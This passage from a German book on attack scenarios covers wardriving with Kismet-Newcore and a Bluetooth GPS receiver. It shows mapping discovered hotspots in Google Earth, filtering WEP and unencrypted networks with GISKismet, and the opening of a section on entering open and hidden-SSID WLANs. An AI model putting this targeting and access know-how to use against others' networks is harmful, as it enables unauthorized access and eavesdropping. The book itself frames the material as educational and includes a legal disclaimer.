gpsdevice=/dev/rfcomm4 # Host:port that GPSD is running on. This can be localhost OR remote! gpshost=localhost:2947 # Do we lock the mode? This overrides coordinates of lock \"0\", which will # generate some bad information until you get a GPS lock, but it will # fix problems with GPS units with broken NMEA that report lock 0 gpsmodelock=false # Do we try to reconnect if we lose our link to the GPS, or do we just # let it die and be disabled? gpsreconnect=true\nDa die HOLUX GPSlim 240 auf Bluetooth-Basis stets gute Ergebnisse liefert, m\u00f6chten wir das einmalige Prozedere der Einrichtung exemplarisch an diesem Empf\u00e4nger durchspielen. Zun\u00e4chst muss sichergestellt sein, dass s\u00e4mtliche zum Betrieb von Bluetooth und GPS erforderlichen Komponenten installiert sind (wie beispielsweise bluez, bluez-utils, gpsd, gpsd-clients etc.) und sowohl der Bluetooth-Dienst als auch die dazugeh\u00f6rige Schnittstelle aktiviert wurden. Was folgt, ist die Suche nach der GPS-Mouse mit hcitool, die Kopplung des Bluetooth-Ger\u00e4ts \u00fcber die MAC-Adresse mit sdptool und die anschlie\u00dfende Einbindung in eine Konfigurationsdatei. Die vollst\u00e4ndige Prozedur verl\u00e4uft wie folgt: root@discordia:~# /etc/init.d/bluetooth start Starting bluetooth: bluetoothd. root@discordia:~# echo 1 > /sys/devices/platform/thinkpad_acpi/bluetooth_enable root@discordia:~# hcitool scan Scanning ... 00:12:D2:A9:D7:09 Nokia 6230i 00:0B:0D:6D:A5:3C HOLUX GPSlim240 00:13:FD:89:C2:46 Nokia 6230i 00:1C:CC:C8:4A:BC BlackBerry 8110 00:1D:25:2F:77:35 SGH-U700 00:21:06:07:F4:7E BlackBerry 8110\n16.1 Aufsp\u00fcren von Funknetzen\n271\nroot@discordia:~# sdptool browse 00:0B:0D:6D:A5:3C Browsing 00:0B:0D:6D:A5:3C ... Service Name: SPP slave Service Description: Bluetooth SPP V1.52 Service RecHandle: 0x10000 Service Class ID List: \"Serial Port\" (0x1101) Protocol Descriptor List: \"L2CAP\" (0x0100) \"RFCOMM\" (0x0003) Channel: 1 Language Base Attr List: code_ISO639: 0x656e encoding: 0x6a base_offset: 0x100 root@discordia:~#\nNachdem wir durch sdptool erfahren haben, dass unser Bluetooth-Device mit Channel 1 kommuniziert, ist dieser Wert samt MAC-Adresse der GPS-Mouse in der Datei \u00bb/etc/bluetooth/rfcomm.conf\u00ab einzutragen. Hierzu f\u00fcgen wir der Konfigurationsdatei folgende Zeilen hinzu: rfcomm4 { bind yes; device 00:0B:0D:6D:A5:3C; channel 1; comment \"Serial Port\"; {\nEin abschlie\u00dfendes rfcomm connect 4 liefert uns Gewissheit dar\u00fcber, die Bluetooth-GPSMouse sowohl ordentlich als auch langfristig im System verankert zu haben: root@discordia:~# rfcomm connect 4 Connected /dev/rfcomm4 to 00:0B:0D:6D:A5:3C on channel 1 Press CTRL-C for hangup\nSollte der geneigte Leser mit der Meldung \u00bbCan't create RFCOMM TTY: Address already in use\u00ab konfrontiert werden, scheint das RFCOMM-TTY-Device bereits anderweitig gebunden zu sein. Hier bietet es sich an, zun\u00e4chst ein sudo rfcomm release 4 und darauf ein rfcomm connect 4 einzugeben \u2013 anschlie\u00dfend sollte sich die GPS-Mouse \u00fcber Bluetooth unter \u00bb/dev/rfcomm4\u00ab korrekt ansprechen lassen. Soll Kismet-Newcore mit der GPS-Mouse kommunizieren, gen\u00fcgt die Eingabe von gpsd -N -n -D 3 /dev/rfcomm4 in einer separaten Shell, gefolgt vom Start von Kismet-Newcore \u2013 die GPS-Koordinaten der entdeckten Hotspots werden anschlie\u00dfend aufgezeichnet.\n272\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nIst die GPS-Mouse wie beschrieben eingebunden, reichen folgende Kommandos vor der n\u00e4chsten Wardriving-Session aus, um eine Kartografie der entdeckten Hotspots mittels Kismet-Newcore und GPS erfolgreich angehen zu k\u00f6nnen: root@discordia:~# echo 1 > sys/devices/platform/thinkpad_acpi/bluetooth_enable root@discordia:~# /etc/init.d/bluetooth start root@discordia:~# gpsd -N -n -D 3 /dev/rfcomm4 gpsd: launching (Version 2.37) gpsd: listening on port gpsd gpsd: shmat(0,0,0) succeeded gpsd: shmat(0,0,0) succeeded gpsd: shmat(0,0,0) succeeded gpsd: shmat(0,0,0) succeeded gpsd: successfully connected to the DBUS system bus gpsd: running with effective group ID 0 gpsd: running with effective user ID 0 gpsd: opening GPS data source at '/dev/rfcomm4' gpsd: speed 9600, 8N1 gpsd: Navcom: sent command 0x1c (Test Support Block) gpsd: Navcom: sent command 0x20 (Data Request) \u2013 data block id = ae at rate 00 gpsd: Navcom: sent command 0x20 (Data Request) \u2013 data block id = 86 at rate 0a gpsd: garmin_gps not active. gpsd: no probe matched... gpsd: gpsd_activate(1): opened GPS (5) gpsd: switch_driver(Generic NMEA) called... gpsd: selecting Generic NMEA driver... (...)\nenablesound Kismet-Newcore ist \u00fcber den Parameter enablesound in der Lage, vordefinierte Sounddateien (zum Beispiel eine Sirene) als Signal abzuspielen. Dazu muss man den Wert false in true \u00e4ndern. # Do we use sound? # Not to be confused with GUI sound parameter, this controls wether or not the # server itself will play sound. Primarily for headless or automated systems. enablesound=true\n16.1 Aufsp\u00fcren von Funknetzen\n273\nenablespeech / speechbin \u00dcber den Parameter enablespeech teilt Kismet-Newcore entdeckte Funknetze mit Namen (SSID), dem Kanal und die Verf\u00fcgbarkeit des GPS-Signals per Sprachausgabe mit. Wer mit dem Pkw unterwegs ist oder sein Notebook im Rucksack bei sich tr\u00e4gt, wird die relativ gut verst\u00e4ndlichen Hinweise seines Notebooks wie beispielsweise new network detected, s.s.i.d. linksys, channel 5 schnell zu sch\u00e4tzen wissen. Um Kismet-Newcore sprechen zu h\u00f6ren, muss man zuvor das Sprachsyntheseprogramm Flite110 oder alternativ dazu Festival111 installieren. Unter Debian GNU/Linux gelingt das problemlos durch Aptitude. Liebhaber der manuellen Installation finden die Programmpakete auf den Websites der Entwickler. root@discordia:~# aptitude install flite Paketlisten werden gelesen... Fertig Abh\u00e4ngigkeitsbaum wird aufgebaut Lese Status-Informationen ein... Fertig Lese erweiterte Statusinformationen Initialisiere Paketstatus... Fertig Lese Task-Beschreibungen... Fertig Die folgenden NEUEN Pakete werden zus\u00e4tzlich installiert: flite libflite1{a} 0 Pakete aktualisiert, 2 zus\u00e4tzlich installiert, 0 werden entfernt und 2 nicht aktualisiert. Muss 8392kB an Archiven herunterladen. Nach dem Entpacken werden 14,6MB zus\u00e4tzlich belegt sein. Wollen Sie fortsetzen? [Y/n/?] Schreibe erweiterte Statusinformationen... Fertig (...) Lese erweiterte Statusinformationen Initialisiere Paketstatus... Fertig Schreibe erweiterte Statusinformationen... Fertig Lese Task-Beschreibungen... Fertig root@discordia:~#\nUm die Sprachausgabe zu aktivieren, setzen Sie zun\u00e4chst den Parameter enablespeech von false auf true und abschlie\u00dfend speechbin beispielsweise auf flite.\n110\nhttp://www.speech.cs.cmu.edu/flite\n111\nhttp://www.cstr.ed.ac.uk/projects/festival/download.html\n274\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\n# Does the server have speech? (Again, not to be confused with the GUI's speech) enablespeech=true # Binary used for speech (if not in path, full path must be specified) speechbin=flite # Specify raw or festival; Flite (and anything else that doesn't need formatting # around the string to speak) is 'raw', festival requires the string be wrapped in # SayText(\"...\") speechtype=raw\nNach erfolgreichem Finetuning der Konfigurationsdatei kann Kismet-Newcore (SUIDoder Root-Rechte vorausgesetzt) mit dem Befehl kismet aufgerufen werden, auch wenn wir damit noch nicht am Ende der Einrichtung angekommen sind: Ein neues Element von Kismet-Newcore in Form einer leistungsf\u00e4higen UI m\u00f6chte mit finalen Werten bef\u00fcllt werden. Die neue UI von Kismet-Newcore verwendet die freie C-Programmbibliothek ncurses und bietet neben dem Einsatz von Shortcuts zahlreiche M\u00f6glichkeiten, die es jedoch im Vorfeld zu definieren gilt: So werden nach dem Start diverse Werte zum Startverhalten (launching server on startup, show Kismet server console by default) und zu den Netzwerkschnittstellen eingefordert (capture source), w\u00e4hrend es GPS, Sound und Sprache (speech) im Menu Kismet \u2013 Preferences zu definieren gilt.\nBild 16.12: Kismet-Newcore bei der Konfiguration des Sprachverhaltens\n16.1 Aufsp\u00fcren von Funknetzen\n275\nSind s\u00e4mtliche Einrichtungsschritte erfolgreich vollzogen, pr\u00e4sentiert sich Kismet-Newcore bei der Suche nach Funknetzen mit folgendem Bild:\nBild 16.13: Kismet-Newcore bei der Suche nach Funknetzen\nKismet-Newcore liefert im Mittelteil wesentliche Eckdaten der entdeckten Funknetze (zum Beispiel SSID, BSSID, Kanal, Pakete ...) und verdeutlicht die Verschl\u00fcsselungsmethodik durch farbliche Kennzeichen: Unverschl\u00fcsselte Funknetze werden in Gr\u00fcn, Funknetze mit WEP-Verschl\u00fcsselung in Rot und Funknetze mit WPA/WPA2Verschl\u00fcsselung in Orange angezeigt. Versteckte Funknetze erhalten anstelle der SSID den Hinweis \u00bb\u00ab \u2013 zumindest so lange, bis die SSID automatisiert ermittelt werden konnte. Hinzu kommen Statusmeldungen in der unteren und rechten Seite des Bildschirms, die unter anderem einen \u00dcberblick zu Sessionzeit, Menge der entdeckten Netzwerke, Zahl der aufgezeichneten Pakete, GPS-Koordinaten und verf\u00fcgbarer Akkulaufzeit liefern. Die Bet\u00e4tigung der Tasten (ALT-K) und (K) liefert eine kurze \u00dcbersicht zu den Men\u00fcfunktionen von Kismet-Newcore, mit rechts/links und oben/unten l\u00e4sst sich anschlie\u00dfend im ncurses-Men\u00fcbaum navigieren. Hinzugekommen ist eine alternative Bedienung durch die Maus, die insbesondere Einsteigern die Anwendung etwas erleichtert.\n276\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nBild 16.14: Men\u00fcfunktionen von Kismet-Newcore\nUm Details zu einem in Reichweite befindlichen Hotspot zu erfahren, wandern Sie mit den Cursortasten oben/unten durch die \u00dcbersicht und bet\u00e4tigen auf dem passenden Eintrag die Taste (Return).\nBild 16.15: Wahl des gew\u00fcnschten Hot-Spot in der \u00dcbersicht von Kismet-Newcore\n16.1 Aufsp\u00fcren von Funknetzen\n277\nWas folgt, ist eine detaillierte \u00dcbersicht zum Hotspot; neben SSID, BSSID, Ger\u00e4tehersteller und dem verwendetem Kanal gibt es auch eine \u00dcbersicht zur Signalst\u00e4rke, dem Verschl\u00fcsselungsverfahren und den im WLAN eingeloggten Clients (MAC-Adresse nebst Hersteller).\nBild 16.16: Detaillierte \u00dcbersicht zum Hotspot\nDie vordefinierte Sortierung gesichteter Hotspots ist allerdings nicht f\u00fcr jeden Einsatz zweckm\u00e4\u00dfig; so ist es oftmals sinnvoller, sich die zuletzt entdeckten Hotspots anzeigen zu lassen oder sich beispielsweise auf unverschl\u00fcsselte Hotspots zu konzentrieren. Sortierungen lassen sich im Men\u00fc Sort durchf\u00fchren \u2013 entweder per Maus, Cursortaste nebst Return oder durch Shortcuts. Geht es beispielsweise darum, eine Gruppierung der zuletzt entdeckten Hotspots vorzunehmen, kann entweder der Weg \u00fcber Sort \u2013 Latest Seen beschritten werden oder aber alternativ durch die Bet\u00e4tigung der Shortcut-Tastenkombination (ALT-S) und (L) (oftmals auch mit der Nomenklatur '~Sl' bezeichnet). Die Shortcut-K\u00fcrzel lassen sich dem Men\u00fc von Kismet-Newcore entnehmen; in der zentralen \u00dcbersicht sind die zusammen mit der Taste [ALT] zu bet\u00e4tigenden Felder unterstrichen (Kismet, Sort, View und Window), die Folgetasten stehen jeweils hinter den Aktionstypen.\n278\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nBild 16.17: \u00dcbersicht der Shortcut-K\u00fcrzel (Latest Seen = \u00bbl\u00ab)\nWir weisen darauf hin, dass Kismet-Newcore dem bewanderten Funkforscher noch deutlich mehr M\u00f6glichkeiten bietet, Details \u00fcber entdeckte Hotspots zu erfahren. F\u00fcr unser anvisiertes Ziel, sich in ein Funknetz einzuklinken, reichen die bis jetzt gewonnenen Informationen jedoch aus, sodass wir im Folgenden keine tief gehenden Details von Kismet-Newcore ansprechen werden. Wir m\u00f6chten den Leser aber nicht in Unkenntnis dar\u00fcber lassen, dass es beispielsweise ein leistungsf\u00e4higes Plugin-Management112 gibt, mit dem Kismet-Newcore durch das Aircrack-PTW-Plugin113 nicht nur automatisiert WEP-Verschl\u00fcsselungen brechen, sondern auch DECT-Gespr\u00e4che114 aufzeichnen kann. Best\u00fcckt mit dem DECT-Plugin kleidet sich Kismet-Newcore in folgendes Gewand:\nBild 16.18: Kismet-Newcore mit dem DECT-Plugin\n112\nhttp://www.kismetwireless.net/links.shtml\n113\nhttps://www.kismetwireless.net/code/svn/trunk/plugin-ptw\n114\nhttps://dedected.org/trac/wiki/COM-ON-AIR-Kismet\n16.2 Kartografierung von Funknetzen\n279\nWollen Sie sich intensiver mit Kismet besch\u00e4ftigen, legen wir Ihnen ein Studium der Dokumentation115 und einen Besuch des Kismet-Forums116 ans Herz.\n16.2\nKartografierung von Funknetzen\nDie Autoren veranschaulichen die Kartografierung (das Eintragen der GPS-Koordinaten von Hotspots in eine Landkarte) mit Google Maps117/Google Earth118 sowohl unter Verwendung einer Kombination aus dem Windows-Tool Vistumbler und dem webbasierten Online-Converter GPS Visualizer119 als auch mittels Kismet-Newcore und GISKismet120. Das formvollendete Ergebnis sieht in Google Earth dann aus wie folgt:\nBild 16.19: Kartografierte Funknetze in Google Earth\n\u00dcber die oftmals anzutreffende L\u00f6sung, bestehend aus NetStumbler, Stumbverter121 und dem kostenpflichtigen Microsoft MapPoint122, ist nach Auffassung der Autoren bereits\n115\nhttp://www.kismetwireless.net/documentation.shtml\n116\nhttps://www.kismetwireless.net/Forum/General\n117\nhttp://maps.google.de\n118\nhttp://earth.google.de\n119\nhttp://www.gpsvisualizer.com\n120\nhttp://my-trac.assembla.com/giskismet\n121\nhttp://www.sonar-security.com/sv.html\n122\nhttp://www.microsoft.com/mappoint/default.mspx\n280\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\numfassend in der Fachliteratur und auf einschl\u00e4gigen Internet-Websites123 berichtet worden, sodass wir von einer weiteren Erl\u00e4uterung absehen. Zudem legen wir Wert auf eine kostenfreie und damit f\u00fcr jeden Leser umzusetzende L\u00f6sung, die nicht vom Kauf eines kommerziellen Produkts abh\u00e4ngig ist. Zuletzt m\u00f6chten wir noch darauf hinweisen, dass es \u2013 speziell in der anschlie\u00dfend vorgestellten Kombination \u2013 vielf\u00e4ltige M\u00f6glichkeiten zur Konfiguration gibt, wir uns jedoch aus Platzgr\u00fcnden auf die g\u00e4ngigsten Varianten beschr\u00e4nken.\n16.2.1 Kartografierung von Funknetzen mit Google Maps Zur Kartografierung mit Google Maps m\u00fcssen folgende Voraussetzungen erf\u00fcllt sein: \u2022\nLog-Files entdeckter Hotspots nebst GPS-Koordinaten eines WLAN-Scanners wie beispielsweise Vistumbler oder NetStumbler\n\u2022\nPC mit Internetbrowser und Internetzugang\nNach der Entdeckung einer Ihnen als ausreichend erscheinenden Anzahl von Funknetzen \u2013 hier verdeutlicht durch das Programm Vistumbler \u2013 speichern Sie diese in einem f\u00fcr GPS Visualizer verst\u00e4ndlichen Datenformat ab, wie beispielsweise TXT, CSV, KLM, GPX oder NS1 (durch Datei \u2013 Speichern unter TXT oder Export \u2013 Exportieren nach TXT, CSV, KML, GPX oder NS1).\nBild 16.20: Speichern einer Vistumbler-Datei im Textformat\nIm n\u00e4chsten Schritt starten Sie einen Webbrowser, besuchen die GPS-Visualizer-Website124 unter www.gpsvisualizer.com und folgen dem Link Draw a Map125.\nBild 16.21: GPS Visualizer-Website, Link DRAW A MAP\n123\nz. B. unter http://www.heise.de/security/artikel/39430/2\n124\nhttp://www.gpsvisualizer.com\n125\nhttp://www.gpsvisualizer.com/map\n16.2 Kartografierung von Funknetzen\n281\nKlicken Sie auf der geladenen Website mit der \u00dcberschrift Make a Google Map from a GPS file unter Upload your GPS data files here auf den Button Durchsuchen, und \u00f6ffnen Sie \u00fcber die folgende Eingabemaske die gespeicherte Textdatei. Die restlichen Optionen der Website k\u00f6nnen nach Vorliebe des Lesers ver\u00e4ndert werden (wenn beispielsweise die reine Kartendarstellung von Google Maps gew\u00fcnscht ist, muss unter Initial map type die Option Google street map ausgew\u00e4hlt werden), reichen f\u00fcr unser Vorhaben mit DefaultWerten jedoch aus.\nBild 16.22: GPS Visualizer-Website, Link Upload your GPS data files here\nEin Klick auf die Schaltfl\u00e4che Draw the Map (vgl. Abb. 16.23) \u00f6ffnet eine Website wie die folgende (vgl. Abb. 16.24) und vollendet damit die Kartografierung in Google Maps.\nBild 16.23: GPS Visualizer-Website, Button Draw the map\n282\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nBild 16.24: GPS Visualizer-Website, Google Maps output\n16.2.2 Kartografierung von Funknetzen mit Google Earth und Vistumbler Die Kartografierung mit Google Earth gestaltet sich \u00e4hnlich wie mit Google Maps. Hierf\u00fcr bedarf es folgender Voraussetzungen: \u2022\nVistumbler-Log-File(s) entdeckter Hotspots inklusive GPS-Koordinaten\n\u2022\nInstallation von Google Earth\nErneut sind die mit Vistumbler entdeckten Funknetze abzuspeichern, diesmal jedoch exportiert als KML-Datei (Export \u2013 Exportieren nach KML \u2013 All APs.\n16.2 Kartografierung von Funknetzen\n283\nBild 16.25: Export einer Vistumbler-Session im KML-Format f\u00fcr Google Earth\nIn der folgenden Maske lassen sich Feinheiten zum Export definieren, wir belassen es jedoch bei den Default-Werten.\nBild 16.26: Export nach KML beim Vistumbler\nNach dem Export erscheint ein Hinweis auf die erfolgreiche Speicherung, die Datei kann anschlie\u00dfend mit Google Earth verarbeitet werden.\nBild 16.27: Speicherung von KMZ-Datei f\u00fcr Google Earth\nLaden Sie anschlie\u00dfend Google Earth, gehen auf Datei / \u00d6ffnen, und w\u00e4hlen Sie die vom Vistumbler exportierte KMZ-Datei.\n284\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nBild 16.28: Google Earth beim Laden einer KMZ-Datei\nWas folgt, ist ein interessanter Sinkflug auf die Erde, der mitten in dem von Ihnen erkundeten WLAN-Gebiet endet und einem Bild \u2013 je nach angewandter Konfiguration \u2013 wie dem folgenden gleicht. Die Kartografierung in Google Earth ist damit erfolgreich abgeschlossen.\n16.2 Kartografierung von Funknetzen\n285\nBild 16.29: Google Earth bietet eine M\u00f6glichkeit zur Betrachtung erfasster Hotspots\n16.2.3 Kartografierung von Funknetzen mit Google Earth und Kismet-Newcore Die Kartografierung \u00fcber Kismet-Newcore erfolgt in Kombination mit GISKismet. Es bedarf der folgenden Voraussetzungen: \u2022\nKismet-Newcore-Log-File(s) entdeckter Hotspots inklusive GPS-Koordinaten\n\u2022\nInstallation von GISKismet126\n\u2022\nInstallation von Google Earth\nUnser besonderes Interesse gilt den NetXML-Dateien, die Kismet-Newcore bei der Suche nach Funknetzen im Verzeichnis f\u00fcr Logfiles ablegt (zum Beispiel in /var/log/kismet).\n126\nhttp://my-trac.assembla.com/giskismet\n286\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nroot@discordia:/var/log/kismet# ls -lt|head total 34912 -rw-r--r-- 1 root root 1970761 1.gpsxml -rw-r--r-- 1 root root 1199646 1.pcapdump -rw-r--r-- 1 root root 513243 1.nettxt -rw-r--r-- 1 root root 1142239 1.netxml -rw-r--r-- 1 root root 0 1.alert (...) root@discordia:/var/log/kismet#\nJan\n8 20:21 Kismet-20100108-19-47-13-\nJan\n8 20:21 Kismet-20100108-19-47-13-\nJan\n8 20:17 Kismet-20100108-19-47-13-\nJan\n8 20:17 Kismet-20100108-19-47-13-\nJan\n8 19:47 Kismet-20100108-19-47-13-\nGISKismet versetzt uns in die Lage, die mittels Kismet entdeckten Funknetze in eine flexible Form zu bringen, und bietet eine angenehme M\u00f6glichkeit zur kartografischen Verwertung. Das datenbankgest\u00fctzte GISKismet bedient sich SQLite, die Geodaten f\u00fcr Google Earth lassen sich \u00fcber SQL-Statements generieren. Wem diese L\u00f6sung zu umfangreich erscheint, da lediglich ein Konverter gebraucht wird, der NetXML-Dateien in KML-Dateien umwandelt, mag vielleicht an den PythonSkripten pykismetkml127 oder netxml2kml128 seine Freude finden. Zun\u00e4chst weisen wir GISKismet dazu an, die NetXML-Dateien von Kismet-Newcore zu analysieren \u2013 die Hotspots werden hierbei in einer Datei namens wireless.dbl integriert: root@discordia:/var/log/kismet# giskismet -x Kismet-20100108-19-47-131.netxml Checking Database for BSSID: 00:03:C9:43:B1:1F ... AP added Checking Database for BSSID: 00:03:C9:44:0C:11 ... AP added (...) root@discordia:/var/log/kismet#\nIm n\u00e4chsten Schritt k\u00f6nnen wir beispielsweise s\u00e4mtliche Hotspots in eine f\u00fcr Google Earth verwertbare KML-Datei exportieren lassen: root@discordia:/var/log/kismet# giskismet -q \"select * from wireless\" -o wireless_all.kml\n127\nhttp://code.google.com/p/pykismetkml/wiki/pykismetkml\n128\nhttp://www.salecker.org/software/netxml2kml\n16.2 Kartografierung von Funknetzen\n287\nGISKismet l\u00e4dt zum Modifizieren ein, zahlreiche Variationen sind denkbar. M\u00f6chten wir beispielsweise erfahren, welche Hotspots auf die ESSID \u00bbNETGEAR\u00ab lauschen, geschieht dies durch: root@discordia:/var/log/kismet# giskismet -q \"select * from wireless where ESSID='NETGEAR'\" -o wireless_netgear.kml\nGleiches gilt nat\u00fcrlich auch f\u00fcr Fragen der Verschl\u00fcsselung; M\u00f6chten wir erfahren, welche Hotspots sich leichtsinnigerweise der unsicheren WEP-Verschl\u00fcsselung bedienen, geschieht dies durch: root@discordia:/var/log/kismet# giskismet -q \"select * from wireless where Encryption='WEP'\" -o wireless_wepencryption.kml\nDie Frage, welches Statement g\u00e4nzlich unverschl\u00fcsselte Funknetze offenbart, mag sich an dieser Stelle m\u00f6glicherweise bereits er\u00fcbrigt haben, der Vollst\u00e4ndigkeit halber hier jedoch auch dieses Kommando: root@discordia:/var/log/kismet# giskismet -q \"select * from wireless where Encryption='None'\" -o wireless_noencryption.kml root@discordia:/var/log/kismet# ls -lt|head total 34976 -rw-r--r-- 1 root root 49826 Jan 9 21:17 wireless_noencryption.kml -rw-r--r-- 1 root root 60323 Jan 9 21:18 wireless_wepencryption.kml -rw-r--r-- 1 root root 18297 Jan 9 21:16 wireless_netgear.kml -rw-r--r-- 1 root root 343980 Jan 9 21:03 wireless_all.kml -rw-r--r-- 1 root root 106496 Jan 9 21:02 wireless.dbl -rw-r--r-- 1 root root 1970761 Jan 8 20:21 Kismet-20100108-19-47-131.gpsxml -rw-r--r-- 1 root root 1199646 Jan 8 20:21 Kismet-20100108-19-47-131.pcapdump (...) root@discordia:/var/log/kismet#\n288\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nImportieren wir das Ergebnis der zuletzt durchgef\u00fchrten Analyse zu unverschl\u00fcsselt betriebenen Hotspots in Google Earth, erhalten wir ein Bild \u00e4hnlich dem folgenden:\nBild 16.30: GISKismet illustriert unverschl\u00fcsselte Hotspots par excellence\n16.3\nAngriffe auf Funknetze\nIn diesem Abschnitt stellen wir grundlegende Techniken versierter Funknetzforscher unter GNU/Linux vor, die ein Mitspielen an Hot-Spots erm\u00f6glicht, auch wenn vom Betreiber g\u00e4ngige Schutzmechanismen ergriffen wurden. Wir weisen sicherheitshalber erneut darauf hin, dass es sich bei diesem Buch grunds\u00e4tzlich um eine Horizonterweiterung \u00fcber Praktiken der \u00bbdunklen Seite der Macht\u00ab handelt und nicht etwa um einen Aufruf zu Straftaten. In Deutschland ist beispielsweise das Andocken in einem fremden Funknetz strafbar, wenn daf\u00fcr Schutzma\u00dfnahmen gebrochen werden m\u00fcssen \u2013 oder wenn Gerichte wie das Amtsgericht Wuppertal129 beim \u00bbSchwarzsurfen\u00ab eine Mindermeinung vertreten. Die Sicherheitsmerkmale eines WLAN in Privathaushalten und im SOHO-Bereich, aber auch in gro\u00dfen Unternehmen, reichen von keinerlei Sicherheitsvorkehrungen bis zu mehrstufigen L\u00f6sungen. Die Autoren haben innerhalb der eingangs beschriebenen Feldversuche \u00e4u\u00dferst paradoxe Strukturen entdeckt: So sind unverschl\u00fcsselte Hot-Spots in Unternehmen zwar seltener anzutreffen als in Privathaushalten, dienen dann jedoch oftmals als riskante Bridge und leiten einen Gro\u00dfteil des LAN-Traffics in das auch von au\u00dferhalb zug\u00e4ngliche Funknetz. Welcher Netzwerkforscher ger\u00e4t bei unverschl\u00fcsselten, f\u00fcr jeden mitzuh\u00f6renden durch den \u00c4ther funkenden Netzen nicht in Verz\u00fcckung? Auf der anderen Seite entdeckten wir jedoch Privathaushalte, die (sch\u00e4tzungsweise) mit OpenVPN/IPSEC ein WLAN unabh\u00e4ngig von in WLAN-Routern eingebetteten Industriestandards betreiben. Verwirrender k\u00f6nnte es kaum sein.\n129\nAmtsgericht Wuppertal, Urteil vom 3.4.2007, Az.29 DS 70 Js 6906/06\n16.3 Angriffe auf Funknetze\n289\nDer Betrieb eines WLAN h\u00e4ngt prim\u00e4r vom Wissen und von der Motivation des jeweiligen Betreibers ab. F\u00fcr die anschlie\u00dfende Vorstellung konzentrieren wir uns auf g\u00e4ngige Angriffsszenarien: \u2022\nZugriff auf ein offenes WLAN\n\u2022\nZugriff auf ein WLAN, dessen Hot-Spot keine SSID sendet\n\u2022\nZugriff auf ein WLAN, das keinen DHCP-Dienst anbietet\n\u2022\nZugriff auf ein mit MAC-Filter gesichertes WLAN\n\u2022\nZugriff auf ein WEP-verschl\u00fcsseltes WLAN\n\u2022\nZugriff auf ein WPA- oder WPA2-verschl\u00fcsseltes WLAN\n16.3.1 Zugriff auf ein offenes WLAN Der Zugriff auf ein offenes Funknetz verl\u00e4uft unter Linux relativ unspektakul\u00e4r: Hat der Funknetzforscher mit dem Programm Kismet-Newcore ein WLAN entdeckt, dienen die \u00fcblichen Kommandos zum Einloggen. In unserem Szenario hat Kismet-Newcore also das offene, unverschl\u00fcsselte WLAN mit der SSID HOMEOFFICE entdeckt. Wir gehen davon aus, dass die WLAN-Netzwerkkarte als wlan0 angesprochen wird. Die Kommandos zum Verbindungsaufbau lauten somit: root@discordia:~# ifconfig wlan0 down root@discordia:~# iwconfig wlan0 mode managed root@discordia:~# iwconfig wlan0 essid \"HOMEOFFICE\" root@discordia:~#\nMit dem Befehl iwconfig l\u00e4sst sich optional pr\u00fcfen, ob die eingepflegten Werte angenommen wurden. Anschlie\u00dfend kann das Netzwerk-Interface mit dem Kommando ifconfig wlan0 up wieder hochgefahren werden. iwconfig pr\u00fcft zudem, ob die Verbindung zum Hotspot beziehungsweise zum Access Point HOMEOFFICE korrekt hergestellt wurde. Besteht eine Verbindung, l\u00e4sst sich das dem Eintrag Access-Point entnehmen: In dem Fall erscheint die MAC-Adresse des Hotspots. Unterbleibt jegliche Konnektivit\u00e4t, kann dies an einem zu schwachen Signal des Hotspots liegen. In solch einem Fall hilft nur die Verbesserung der Signalqualit\u00e4t, entweder durch die Verk\u00fcrzung des Abstands zum erfassten Hotspot oder die Verwendung einer leistungsf\u00e4higeren Antenne. Bietet der Hotspot die M\u00f6glichkeit, per DCHP eine IP-Adresse zu erfragen, l\u00e4sst sich dies beispielsweise mit dem Kommando dhclient wlan0 durchf\u00fchren. Mit ifconfig wlan0 wird abschlie\u00dfend kontrolliert, ob das Einbuchen in das Netzwerk durch Erhalt einer IP-Adresse vom DHCP-Server erfolgreich war. Der Rechner ist daraufhin erfolgreich im WLAN eingebunden.\n290\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\n16.3.2 Zugriff auf ein WLAN, dessen Hotspot keine SSID sendet Hat der Betreiber des WLAN daf\u00fcr gesorgt, dass die SSID des Hotspots durch SSID Broadcast disable nicht gesendet wird und somit verborgen bleibt, kann Kismet-Newcore als passiver WLAN-Scanner seine St\u00e4rken ausspielen: Das Tool entdeckt auch versteckte Hotspots. Aktive WLAN-Scanner wie Vistumbler nehmen derartig verschleierte Funknetze jedoch nicht wahr. In unserem Szenario gehen wir davon aus, dass Kismet folgendes Bild pr\u00e4sentiert. Uns interessiert im Besonderen der unverschl\u00fcsselte Access Point mit dem Namen auf Kanal 1.\nBild 16.31: Entdeckung eines WLAN mit versteckter SSID\nW\u00e4hrend Kismet-Newcore den Verkehr belauscht, erscheint ein paar Sekunden sp\u00e4ter bereits die erste IP-Adresse eines der im WLAN eingebuchten Clients. Zur Intensivierung der Konglomeration von Daten empfiehlt sich der Verzicht auf Channel-Hopping und das Locking des Kanals 1. Durch die Bet\u00e4tigung der Tasten (ALT-K) und (L) f\u00fcr \u00bbKismet \u2013 Config Channel\u00ab nebst Channel-Angabe richtet Kismet seine volle Aufmerksamkeit ausschlie\u00dflich auf den so fixierten Kanal:\n16.3 Angriffe auf Funknetze\n291\nBild 16.32: Kismet-Newcore beim Locking eines WLAN-Kanals\nWie in der Vorstellung von Kismet-Newcore bereits verdeutlicht, erm\u00f6glichen die Cursortasten und ein abschlie\u00dfender Druck der Taste (Return) eine eingehende Betrachtung des favorisierten Hotspots. Neben SSID, BSSID, Ger\u00e4tehersteller und dem verwendetem Kanal gibt es unter anderem eine \u00dcbersicht zur Signalst\u00e4rke, dem Verschl\u00fcsselungsverfahren und die im WLAN eingeloggten Clients \u2013 inklusive MAC-/IPAdresse, Verbindungstyp und Ger\u00e4tehersteller. Sp\u00e4testens jetzt sollte jedem klar sein, dass ein WLAN-MAC-Filter keine nennenswerte H\u00fcrde f\u00fcr potenzielle Eindringlinge darstellt.\nBild 16.33: Kismet-Newcore sp\u00fcrt Clients auf, die im WLAN eingebucht sind\nNach einer weiteren Beobachtung des Netzwerktraffics ist Kismet-Newcore in der Lage, die urspr\u00fcnglich unsichtbare SSID des WLAN aufzudecken: Der Name des WLAN lautet UNSICHTBAR (vgl. Abb. 16.34). Ein Druck auf die Taste (Return) liefert wie gehabt 